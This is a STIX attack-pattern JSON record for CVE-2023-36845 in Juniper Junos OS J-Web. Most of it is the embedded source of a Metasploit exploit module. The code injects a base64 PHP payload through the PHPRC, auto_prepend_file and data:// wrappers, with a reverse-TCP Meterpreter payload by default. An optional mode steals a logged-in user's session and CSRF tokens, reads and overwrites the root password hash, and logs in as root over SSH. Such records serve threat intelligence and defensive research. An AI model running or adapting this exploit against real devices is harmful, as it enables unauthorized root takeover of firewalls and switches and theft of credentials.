{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9b5dd453-0176-448f-899d-a3fdecd2e0da",
    "created": "2024-08-14T16:33:40.934859Z",
    "modified": "2024-08-14T16:33:40.934864Z",
    "name": "Junos OS PHPRC Environment Variable Manipulation RCE",
    "description": " This module exploits a PHP environment variable manipulation vulnerability affecting Juniper SRX firewalls and EX switches. The affected Juniper devices run FreeBSD and every FreeBSD process can access their stdin by opening /dev/fd/0. The exploit also makes use of two useful PHP features. The first being 'auto_prepend_file' which causes the provided file to be added using the 'require' function. The second PHP",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/http/junos_phprc_auto_prepend_file.rb",
            "external_id": "junos_phprc_auto_prepend_file.rb"
        },
        {
            "source_name": "reference",
            "url": "https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/"
        },
        {
            "source_name": "reference",
            "url": "https://vulncheck.com/blog/juniper-cve-2023-36845"
        },
        {
            "source_name": "reference",
            "url": "https://supportportal.juniper.net/s/article/2023-08-Out-of-Cycle-Security-Bulletin-Junos-OS-SRX-Series-and-EX-Series-Multiple-vulnerabilities-in-J-Web-can-be-combined-to-allow-a-preAuth-Remote-Code-Execution?language=en_US"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-36845"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'unix_crypt'\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::SSH\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Junos OS PHPRC Environment Variable Manipulation RCE',\n        'Description' => %q{\n          This module exploits a PHP environment variable manipulation vulnerability affecting Juniper SRX firewalls\n          and EX switches. The affected Juniper devices run FreeBSD and every FreeBSD process can access their stdin\n          by opening /dev/fd/0. The exploit also makes use of two useful PHP features. The first being\n          'auto_prepend_file' which causes the provided file to be added using the 'require' function. The second PHP\n          function is 'allow_url_include' which allows the use of URL-aware fopen wrappers. By enabling\n          allow_url_include, the exploit can use any protocol wrapper with auto_prepend_file. The module then uses\n          data:// to provide a file inline which includes the base64 encoded PHP payload.\n\n          By default this exploit returns a session confined to a FreeBSD jail with limited functionality. There is a\n          datastore option 'JAIL_BREAK', that when set to true, will steal the necessary tokens from a user authenticated\n          to the J-Web application, in order to overwrite the the root password hash. If there is no user\n          authenticated to the J-Web application this method will not work. The module then authenticates\n          with the new root password over SSH and then rewrites the original root password hash to /etc/master.passwd.\n        },\n        'Author' => [\n          'Jacob Baines',  # Analysis\n          'Ron Bowes',     # Jail break technique + Target setup instructions\n          'jheysel-r7'     # Msf module\n        ],\n        'References' => [\n          [ 'URL', 'https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/'],\n          [ 'URL', 'https://vulncheck.com/blog/juniper-cve-2023-36845'],\n          [ 'URL', 'https://supportportal.juniper.net/s/article/2023-08-Out-of-Cycle-Security-Bulletin-Junos-OS-SRX-Series-and-EX-Series-Multiple-vulnerabilities-in-J-Web-can-be-combined-to-allow-a-preAuth-Remote-Code-Execution?language=en_US'],\n          [ 'CVE', '2023-36845']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => %w[php unix],\n        'Privileged' => false,\n        'Arch' => [ARCH_PHP, ARCH_CMD],\n        'Targets' => [\n          [\n            'PHP In-Memory',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Type' => :php_memory,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n                'RPORT' => 80\n              }\n            },\n          ],\n          [\n            'Interactive SSH with jail break',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'Type' => :nix_stream,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/interact',\n                'WfsDelay' => 30\n              },\n              'Payload' => {\n                'Compat' => {\n                  'PayloadType' => 'cmd_interact',\n                  'ConnectionType' => 'find'\n                }\n              }\n            }\n          ]\n\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-08-17',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE, ],\n          'SideEffects' => [ CONFIG_CHANGES ],\n          'Reliability' => [ REPEATABLE_SESSION, ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TMP_ROOT_PASSWORD', [ true, 'If target is set to \"Interactive SSH with jail break\", the root user\\'s password will be temporarily changed to this password', rand_text_alphanumeric(24)]),\n      OptPort.new('SSH_PORT', [true, 'SSH port of Junos Target', 22]),\n      OptInt.new('SSH_TIMEOUT', [ true, 'The maximum acceptable amount of time to negotiate a SSH session', 30])\n    ])\n  end\n\n  def check\n    non_existent_file = rand_text_alphanumeric(8..16)\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'data' => \"LD_PRELOAD=/tmp/#{non_existent_file}\"\n    )\n\n    return CheckCode::Appears('Environment variable manipulation succeeded indicating this target is vulnerable.') if res && res.body.include?(\"Cannot open \\\"/tmp/#{non_existent_file}\\\"\")\n\n    CheckCode::Safe('Environment variable manipulation failed indicating this target is not vulnerable.')\n  end\n\n  def send_php_exploit(phprc, file_contents)\n    post_data = \"allow_url_include=1\\n\"\n    post_data << \"auto_prepend_file=\\\"data://text/plain;base64,#{Rex::Text.encode_base64(file_contents)}\\\"\"\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'POST',\n      'data' => post_data,\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_get' => {\n        'PHPRC' => phprc\n      }\n    )\n  end\n\n  def get_php_session_id\n    get_var_sess = \"<?php print_r(scandir('/var/sess'));?>\"\n    res = send_php_exploit('/dev/fd/0', get_var_sess)\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response (response code: #{res.code})\") unless res.code == 200\n\n    php_session_id = res.body.scan(/\\[\\d+\\] => sess_(.*)/).flatten[0]\n\n    fail_with(Failure::UnexpectedReply, \"Failed to retrieve a PHP Session ID. There might not be a user logged in at the moment which would cause this to fail.\\n Try setting JAIL_BREAK to false to in order to get a session as the 'nobody' user. Or try again when a there is a user authenticated to the J-Web application.\") unless php_session_id\n    print_status(\"Found PHPSESSID: #{php_session_id}.\")\n    php_session_id\n  end\n\n  def get_csrf_token(php_session_id)\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'diagnose'),\n      'method' => 'GET',\n      'headers' =>\n        {\n          'Cookie' => \"PHPSESSID=#{php_session_id}\"\n        },\n      'vars_get' => {\n        'm[]' => 'pinghost'\n      }\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response (response code: #{res.code})\") unless res.code == 200\n\n    csrf_token = res.get_html_document.xpath(\"//input[@type='hidden' and @name='csrf_token']/@value\").text\n    fail_with(Failure::UnexpectedReply, 'Unable to retrieve a csrf token') unless csrf_token\n    print_status(\"Found csrf token: #{csrf_token}.\")\n    csrf_token\n  end\n\n  def get_encrypted_root_password(php_session_id, csrf_token)\n    post_data = \"rs=get_cli_data&rsargs[]=getQuery&csrf_token=#{csrf_token}&key=1\"\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'jsdm', 'ajax', 'cli-editor.php'),\n      'method' => 'POST',\n      'data' => post_data,\n      'ctype' => 'application/x-www-form-urlencoded',\n      'headers' =>\n        {\n          'Cookie' => \"PHPSESSID=#{php_session_id}\"\n        }\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response (response code: #{res.code})\") unless res.code == 200\n\n    # The body of the above request is formatted like so:\n\n    ## Last changed: 2023-09-25 13:00:49 UTC\n    # version 20200609.165031.6_builder.r1115480;\n    # system {\n    #   host-name JUNOS;\n    #   root-authentication {\n    #     encrypted-password \"$6$yMwZY.o0$WwCZgzN7FTDfhSvkum0y9ry/nu4yWOQcgW.JJz0vJapf5P6XHoCsigsz94oEKSPO5efKFP/JhhN3/FCKvB0Hp.\";\n    #   }\n    #   login {\n    #     user admin {\n    #       uid 2000;\n    #       class super-user;\n    #       authentication {\n    #         encrypted-password \"$6$65gs/MrK$DNpVWfIocQ.rG/ThjZXjRI/yha/lf1UImNKivq.T1K4yLW60PWFrcQakoP6mwHT9Cr3xQZZfomKSTRXWl2aWj1\";\n    #       }\n    #     }\n\n    fail_with(Failure::UnexpectedReply, 'ssh root-login is not permitted on the device thus the module will not be able to establish a session or restore the original root password.') unless res.body.scan(/\"ssh\\s+\\{\\n\\s+root-login\\s+allow;\"/)\n    # Multiple passwords are displayed in the output, ensure we grab the encrypted-password that belongs to the\n    # root-authentication configuration with the following regex:\n    og_encrypted_root_pass = res.body.scan(/root-authentication\\s+\\{\\n\\s+encrypted-password\\s+\"(.+)\"/).flatten[0]\n    fail_with(Failure::UnexpectedReply, 'Unable to retrieve the encrypted root password from the response') unless og_encrypted_root_pass\n\n    print_status(\"Original encrypted root password: #{og_encrypted_root_pass}\")\n    og_encrypted_root_pass\n  end\n\n  def set_root_password(php_session_id, csrf_token, password_hash)\n    post_data = \"&current-path=/system/root-authentication/&csrf_token=#{csrf_token}&key=1&JTK-FIELD-encrypted-password=#{password_hash}\"\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'editor', 'edit', 'configuration', 'system', 'root-authentication'),\n      'method' => 'POST',\n      'data' => post_data,\n      'ctype' => 'application/x-www-form-urlencoded',\n      'headers' =>\n        {\n          'Cookie' => \"PHPSESSID=#{php_session_id}\"\n        },\n      'vars_get' => {\n        'action' => 'commit'\n      }\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response (response code: #{res.code})\") unless res.code == 200\n\n    unless res.get_html_document.xpath(\"//body/div[@class='commit-status' and @id='systest-commit-status-div']\").text == 'Success'\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response (response code: #{res.code})\")\n    end\n    print_status(\"Successfully changed the root user's password \")\n  end\n\n  def ssh_login\n    ssh_opts = ssh_client_defaults.merge({\n      port: datastore['SSH_PORT'],\n      auth_methods: ['password'],\n      password: datastore['TMP_ROOT_PASSWORD']\n    })\n\n    begin\n      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        Net::SSH.start(rhost, 'root', ssh_opts)\n      end\n    rescue Net::SSH::Exception => e\n      vprint_error(\"#{e.class}: #{e.message}\")\n      return nil\n    end\n\n    if ssh\n      Net::SSH::CommandStream.new(ssh)\n    end\n  end\n\n  def exploit\n    case target['Type']\n    when :nix_stream\n      print_status(\"Attempting to break out of FreeBSD jail by changing the root user's password, establishing an SSH session and then rewriting the original root user's password hash to /etc/master.passwd.\")\n      print_warning(\"This requires a user is authenticated to the J-Web application in order to steal a session token, also 'ssh root-login' is set to 'allow' on the device\")\n      php_session_id = get_php_session_id\n      csrf_token = get_csrf_token(php_session_id)\n      @og_encrypted_root_pass = get_encrypted_root_password(php_session_id, csrf_token)\n      tmp_password_hash = UnixCrypt::SHA512.build(datastore['TMP_ROOT_PASSWORD'])\n      print_status \"Temporary root password Hash: #{tmp_password_hash}\"\n      set_root_password(php_session_id, csrf_token, tmp_password_hash)\n\n      if (ssh = ssh_login)\n        print_good('Logged in as root')\n        handler(ssh.lsock)\n      end\n\n      set_root_password(php_session_id, csrf_token, @og_encrypted_root_pass)\n\n    when :php_memory\n      send_php_exploit('/dev/fd/0', payload.encoded)\n    else\n      fail_with(Failure::BadConfig, 'Please select a valid target.')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-08-17",
    "x_mitre_platforms": [
        "unix'"
    ]
}